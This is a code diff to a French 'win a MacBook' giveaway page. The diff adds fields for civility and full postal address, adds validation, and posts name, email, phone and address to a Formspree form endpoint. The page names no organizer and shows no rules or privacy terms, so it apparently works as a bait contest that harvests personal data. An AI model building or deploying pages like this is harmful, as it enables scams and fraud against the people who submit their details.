@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MacBook Neo</title>
+<title>Gagnez un MacBook</title>
 
 <style>
 body {
@@ -32,10 +32,11 @@ img {
   width: 100%;
   border-radius: 20px;
   margin-bottom: 20px;
+  object-fit: cover;
 }
 
 h1 {
-  font-size: 34px;
+  font-size: 32px;
 }
 
 p {
@@ -52,11 +53,6 @@ p {
   cursor: pointer;
   width: 100%;
   margin-top: 20px;
-  transition: 0.2s;
-}
-
-.btn:hover {
-  transform: scale(1.05);
 }
 
 input {
@@ -65,15 +61,14 @@ input {
   margin: 10px 0;
   border-radius: 10px;
   border: none;
-  outline: none;
 }
 
 .hidden {
   display: none;
 }
 
-.success {
-  font-size: 60px;
+.radio-group {
+  text-align: left;
   margin-bottom: 10px;
 }
 </style>
@@ -86,7 +81,7 @@ input {
 
 <!-- PAGE 1 -->
 <div id="step1" class="card">
-  <img src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8">
+  <img src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?auto=format&fit=crop&w=1000&q=80">
   <h1>Gagnez le nouveau MacBook</h1>
   <p>Participez gratuitement pour tenter de remporter ce modèle dernière génération.</p>
   <button class="btn" onclick="showForm()">Participer</button>
@@ -94,14 +89,24 @@ input {
 
 <!-- PAGE 2 -->
 <div id="step2" class="card hidden">
-  <img src="https://images.unsplash.com/photo-1496181133206-80ce9b88a853">
+  <img src="https://images.unsplash.com/photo-1496181133206-80ce9b88a853?auto=format&fit=crop&w=1000&q=80">
   <h2>Inscription</h2>
 
   <form id="contestForm">
+
+    <!-- CIVILITE -->
+    <div class="radio-group">
+      <label><input type="radio" name="civilite" value="Mr" required> Mr</label>
+      <label><input type="radio" name="civilite" value="Mme"> Mme</label>
+    </div>
+
     <input type="text" id="nom" placeholder="Nom" required>
     <input type="text" id="prenom" placeholder="Prénom" required>
     <input type="text" id="email" placeholder="Email" required>
     <input type="text" id="telephone" placeholder="Téléphone" required>
+
+    <!-- ADRESSE POSTALE COMPLETE -->
+    <input type="text" id="adresse" placeholder="Adresse postale complète" required>
 
     <button class="btn" type="submit">Valider</button>
   </form>
@@ -109,9 +114,8 @@ input {
 
 <!-- PAGE 3 -->
 <div id="step3" class="card hidden">
-  <img src="https://images.unsplash.com/photo-1605902711622-cfb43c4437d1">
-  <div class="success">🎉</div>
-  <h2>Bravo !</h2>
+  <img src="https://images.unsplash.com/photo-1605902711622-cfb43c4437d1?auto=format&fit=crop&w=1000&q=80">
+  <h2>🎉 Bravo !</h2>
   <p>Votre participation a bien été enregistrée.</p>
   <p>Les résultats vous seront communiqués prochainement.</p>
 </div>
@@ -127,17 +131,31 @@ function showForm() {
 document.getElementById("contestForm").addEventListener("submit", function(e) {
   e.preventDefault();
 
+  const civilite = document.querySelector('input[name="civilite"]:checked')?.value;
   const nom = document.getElementById("nom").value;
   const prenom = document.getElementById("prenom").value;
   const email = document.getElementById("email").value.toLowerCase();
   const telephone = document.getElementById("telephone").value;
+  const adresse = document.getElementById("adresse").value;
+
+  if (!civilite || !nom || !prenom || !email || !telephone || !adresse) {
+    alert("Veuillez remplir tous les champs");
+    return;
+  }
 
   fetch("https://formspree.io/f/xnjozjby", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ nom, prenom, email, telephone })
+    body: JSON.stringify({
+      civilite,
+      nom,
+      prenom,
+      email,
+      telephone,
+      adresse
+    })
   });
 
   document.getElementById("step2").classList.add("hidden");
